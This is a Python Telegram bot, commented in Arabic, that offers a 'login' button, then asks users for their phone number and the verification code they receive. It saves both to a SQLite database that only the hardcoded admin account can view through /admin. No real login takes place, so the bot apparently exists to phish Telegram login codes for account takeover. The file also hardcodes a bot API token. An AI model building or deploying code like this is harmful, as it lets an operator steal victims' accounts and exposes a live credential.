import os
import logging
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# إعدادات السجل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# مراحل المحادثة
PHONE, CODE = range(2)

# تهيئة قاعدة البيانات
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  phone TEXT,
                  code TEXT,
                  session TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

# أمر البدء
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📱 تسجيل الدخول", callback_data="login")]]
    await update.message.reply_text(
        "مرحباً! 👋\nاضغط على الزر لبدء تسجيل الدخول:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ConversationHandler.END

# معالجة الزر
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("📱 أرسل رقم هاتفك:\nمثال: +966501234567")
    return PHONE

# استقبال الرقم
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data['phone'] = phone
    await update.message.reply_text(f"✅ تم استلام الرقم: {phone}\n\nأرسل الكود الآن:")
    return CODE

# استقبال الكود
async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    phone = context.user_data.get('phone', 'غير معروف')
    
    # حفظ في قاعدة البيانات
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, phone, code) VALUES (?, ?, ?)",
              (update.effective_user.id, phone, code))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"🎉 تم التسجيل!\n📞 الرقم: {phone}\n🔐 الكود: {code}")
    return ConversationHandler.END

# أمر للمطور لعرض المستخدمين
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # معرف المطور - ضع معرفك هنا
    ADMIN_ID = 7693421186
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ ليس لديك صلاحية لهذا الأمر.")
        return
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users ORDER BY created_at DESC LIMIT 20")
    users = c.fetchall()
    conn.close()
    
    if not users:
        await update.message.reply_text("📭 لا يوجد مستخدمين مسجلين.")
        return
    
    message = "📋 **آخر 20 مستخدمين:**\n\n"
    for user in users:
        message += f"👤 ID: {user[0]}\n"
        message += f"📞 رقم: {user[1]}\n"
        message += f"🔑 كود: {user[2]}\n"
        message += f"⏰ {user[4]}\n"
        message += "─" * 20 + "\n"
    
    await update.message.reply_text(message[:4000])

# الدالة الرئيسية
def main():
    # تهيئة قاعدة البيانات
    init_db()
    
    # الحصول على التوكن
    TOKEN = os.environ.get("BOT_TOKEN", "8529847407:AAF8SH0yVDPq5JHZSB7FfYmVlluMWZZIQxs")
    
    # إنشاء التطبيق
    app = Application.builder().token(TOKEN).build()
    
    # معالج المحادثة
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern='^login$')],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)]
        },
        fallbacks=[CommandHandler('start', start)]
    )
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("admin", admin))  # أمر المطور
    
    print("🤖 البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
